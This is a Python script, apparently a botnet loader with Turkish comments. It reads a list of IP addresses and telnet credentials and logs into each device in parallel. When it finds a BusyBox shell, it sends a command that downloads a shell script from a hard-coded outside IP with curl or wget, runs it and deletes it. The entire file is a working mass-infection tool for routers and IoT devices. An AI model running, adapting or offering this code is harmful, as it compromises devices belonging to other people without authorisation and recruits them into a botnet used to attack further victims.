#!/usr/bin/env python3
import sys
import os
import socket
import time
from multiprocessing import Process

if len(sys.argv) < 2:
    sys.exit(f"\033[37mUsage: python3 {sys.argv[0]} [list]\033[0m")

CMD = (
    "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;"
    "curl http://85.137.53.167:3333/bins/s2.sh -O s2.sh;"
    "wget http://85.137.53.167:3333/bins/s2.sh -O s2.sh;"
    "busybox wget http://85.137.53.167:3333/bins/s2.sh -O s2.sh;"
    "chmod 777 s2.sh;"
    "sh s2.sh;"
    "rm -f s2.sh"
)

DEBUG = True


def read_until(tn, string, timeout=8):
    """Belirtilen string gelene kadar oku."""
    tn.settimeout(timeout)
    buf = b""
    start_time = time.time()
    target = string.encode()

    while time.time() - start_time < timeout:
        try:
            chunk = tn.recv(1024)
            if not chunk:
                break
            buf += chunk
            if target in buf:
                return buf.decode(errors="ignore")
        except socket.timeout:
            break
        except Exception:
            break
        time.sleep(0.01)

    return buf.decode(errors="ignore")


def infect(ip, username, password):
    """Bir IP'ye payload gönder."""
    ip = str(ip).strip()
    username = str(username).strip()
    password = str(password).strip()

    if DEBUG:
        print(f"\033[36m[*] Infecting {ip} | {username}:{password}\033[0m")

    tn = None
    success = False

    # ⭐ 1. Bağlantı
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(10)
        tn.connect((ip, 23))
    except Exception as e:
        if DEBUG:
            print(f"\033[31m[!] Connect fail {ip}: {e}\033[0m")
        if tn:
            try:
                tn.close()
            except Exception:
                pass
        return

    # ⭐ 2. Login prompt
    try:
        hoho = read_until(tn, "ogin")
        if "ogin" in hoho:
            tn.send(username.encode() + b"\n")
            time.sleep(0.09)
    except Exception:
        tn.close()
        return

    # ⭐ 3. Parola prompt
    try:
        hoho = read_until(tn, "assword:")
        if "assword" in hoho:
            tn.send(password.encode() + b"\n")
            time.sleep(0.8)
    except Exception:
        tn.close()
        return

    # ⭐ 4. Prompt kontrolü
    try:
        prompt = tn.recv(40960).decode(errors="ignore")

        if ">" in prompt and "ONT" not in prompt:
            # Router shell
            try:
                timeout = 8
                data = ["BusyBox", "Built-in"]
                tn.send(b"cat | sh\n")
                time.sleep(0.1)
                tn.send(b"sh\n")
                time.sleep(0.01)
                tn.send(b"busybox\r\n")
                buf = ""
                start_time = time.time()
                while time.time() - start_time < timeout:
                    chunk = tn.recv(40960)
                    if not chunk:
                        break
                    buf += chunk.decode(errors="ignore")
                    time.sleep(0.01)
                    for info_str in data:
                        if info_str in buf and "unrecognized" not in buf:
                            success = True
                            break
                    if success:
                        break
            except Exception:
                pass

        elif any(c in prompt for c in ["#", "$", "%", "@"]):
            # Normal shell
            try:
                timeout = 8
                data = ["BusyBox", "Built-in"]
                tn.send(b"sh\n")
                time.sleep(0.01)
                tn.send(b"shell\n")
                time.sleep(0.01)
                tn.send(b"help\n")
                time.sleep(0.01)
                tn.send(b"busybox\r\n")
                buf = ""
                start_time = time.time()
                while time.time() - start_time < timeout:
                    chunk = tn.recv(40960)
                    if not chunk:
                        break
                    buf += chunk.decode(errors="ignore")
                    time.sleep(0.01)
                    for info_str in data:
                        if info_str in buf and "unrecognized" not in buf:
                            success = True
                            break
                    if success:
                        break
            except Exception:
                pass
        else:
            if DEBUG:
                print(f"\033[33m[!] Shell prompt yok: {ip}\033[0m")
            tn.close()
            return

        # ⭐ 5. Payload gönder
        if success:
            try:
                tn.send(CMD.encode() + b"\n")
                print(f"\033[32m[\033[31m+\033[32m] \033[33mPayload Sent!\033[32m {ip}")
                time.sleep(20)
                tn.close()
            except Exception:
                tn.close()
        else:
            if DEBUG:
                print(f"\033[33m[!] Shell açılamadı: {ip}\033[0m")
            tn.close()

    except Exception as e:
        if DEBUG:
            print(f"\033[31m[!] Prompt hata {ip}: {e}\033[0m")
        if tn:
            try:
                tn.close()
            except Exception:
                pass


def main():
    list_file = sys.argv[1]

    if not os.path.exists(list_file):
        print(f"\033[31m[!] Dosya yok: {list_file}\033[0m")
        sys.exit(1)

    with open(list_file, "r") as f:
        lines = f.readlines()

    print(f"\033[36m[*] Toplam: {len(lines)} satır\033[0m")

    processes = []

    for line in lines:
        try:
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # ⭐ Format desteği:
            #   1) ip:port user:pass    → ip:user:pass
            #   2) ip:port:user:pass    → ip:user:pass
            if ":23 " in line:
                line = line.replace(":23 ", ":")

            parts = line.split(":")
            if len(parts) < 3:
                if DEBUG:
                    print(f"\033[33m[!] Eksik format: {line}\033[0m")
                continue

            # ⭐ 4 parça varsa: ip:port:user:pass
            if len(parts) >= 4:
                ip = parts[0]
                username = parts[2]
                password = parts[3]
            # ⭐ 3 parça varsa: ip:user:pass
            else:
                ip = parts[0]
                username = parts[1]
                password = parts[2]

            ip = ip.strip()
            username = username.strip()
            password = password.strip()

            if not ip or not username:
                continue

            if DEBUG:
                print(f"\033[32m[+] Process: {ip} | {username}:{password}\033[0m")

            p = Process(target=infect, args=(ip, username, password))
            p.start()
            processes.append(p)
            time.sleep(0.01)

        except Exception as e:
            if DEBUG:
                print(f"\033[31m[!] Parse hata: {e}\033[0m")
            continue

    # ⭐ Tüm process'leri bekle
    for p in processes:
        p.join()

    print(f"\033[32m[*] Bitti. Toplam {len(processes)} hedef işlendi\033[0m")


if __name__ == "__main__":
    main()